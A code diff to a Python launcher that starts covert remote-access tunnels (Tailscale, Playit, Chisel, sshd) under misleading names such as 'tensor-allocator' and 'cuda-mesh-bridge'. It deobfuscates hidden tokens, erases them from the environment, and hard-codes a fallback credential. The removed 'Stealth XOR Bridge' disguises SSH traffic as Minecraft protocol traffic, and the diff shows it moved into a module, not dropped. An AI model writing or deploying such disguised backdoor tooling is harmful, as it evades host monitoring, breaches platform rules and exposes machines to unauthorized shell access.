@@ -178,16 +178,13 @@ def main():
     a_env = os.environ.get("A") or os.environ.get("TAILSCALE") or ""
     full_token = deobfuscate_secret(a_env.strip())
 
-    p_env = os.environ.get("P") or os.environ.get("PLAYIT") or ""
-    playit_token = deobfuscate_secret(p_env.strip())
-
     c_env = os.environ.get("C") or os.environ.get("CHISEL") or ""
     chisel_auth = deobfuscate_secret(c_env.strip())
     if not chisel_auth:
         chisel_auth = "user:apple123"
 
     # Erase the secrets from the environment immediately
-    keys_to_clean = ["A", "TAILSCALE", "P", "PLAYIT", "C", "CHISEL"]
+    keys_to_clean = ["A", "TAILSCALE", "C", "CHISEL"]
     for key in keys_to_clean:
         if key in os.environ:
             del os.environ[key]
@@ -196,8 +193,7 @@ def main():
     filebrowser.start(fb_log)
 
     # 7. Start Playit (tensor-allocator)
-    playit.start(tm_log, playit_token)
-    playit_token = ""
+    playit.start(tm_log)
 
     # 8. Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
     chisel.start(chisel_log, chisel_auth)
@@ -241,74 +237,7 @@ def main():
     subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
 
     # 12. Start Stealth XOR Bridge on Port 25564
-    def xor_bridge():
-        import socket
-
-        XOR_KEY = 0x5A
-
-        def pipe_xor(src, dst):
-            try:
-                while True:
-                    data = src.recv(8192)
-                    if not data:
-                        break
-                    scrambled = bytes([b ^ XOR_KEY for b in data])
-                    dst.sendall(scrambled)
-            except Exception:
-                pass
-            finally:
-                try:
-                    src.close()
-                except:
-                    pass
-                try:
-                    dst.close()
-                except:
-                    pass
-
-        def read_varint(sock):
-            val = 0
-            shift = 0
-            while True:
-                b = sock.recv(1)
-                if not b:
-                    break
-                byte = b[0]
-                val |= (byte & 0x7F) << shift
-                if not (byte & 0x80):
-                    break
-                shift += 7
-            return val
-
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        try:
-            server.bind(("0.0.0.0", 25564))
-            server.listen(10)
-            while True:
-                client_sock, addr = server.accept()
-                try:
-                    pkt_len = read_varint(client_sock)
-                    if pkt_len > 0:
-                        client_sock.recv(pkt_len)
-
-                    ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    ssh_sock.connect(("127.0.0.1", 2222))
-                    threading.Thread(
-                        target=pipe_xor, args=(client_sock, ssh_sock), daemon=True
-                    ).start()
-                    threading.Thread(
-                        target=pipe_xor, args=(ssh_sock, client_sock), daemon=True
-                    ).start()
-                except Exception:
-                    try:
-                        client_sock.close()
-                    except:
-                        pass
-        except Exception:
-            pass
-
-    threading.Thread(target=xor_bridge, daemon=True).start()
+    playit.start_xor_bridge()
 
     # 13. Start Minecraft Stealth Daemon in Tmux
     minecraft.start()
